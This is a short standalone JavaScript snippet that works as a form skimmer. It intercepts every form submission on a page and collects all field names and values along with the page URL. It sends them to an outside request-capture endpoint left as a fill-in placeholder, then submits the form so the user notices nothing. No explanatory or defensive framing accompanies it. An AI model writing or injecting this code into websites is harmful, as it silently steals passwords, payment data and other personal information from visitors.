document.addEventListener('submit', function(e) {
    e.preventDefault();
    const URL = 'https://{your-endpoint}.free.beeceptor.com';
    let params = [...e.target.elements].map(param => param.name + "=" + param.value).concat(["url=" + window.location.href]).filter(param => param.length>1).join("&");
    fetch(URL + "?" + params).then(() => e.target.submit());
});
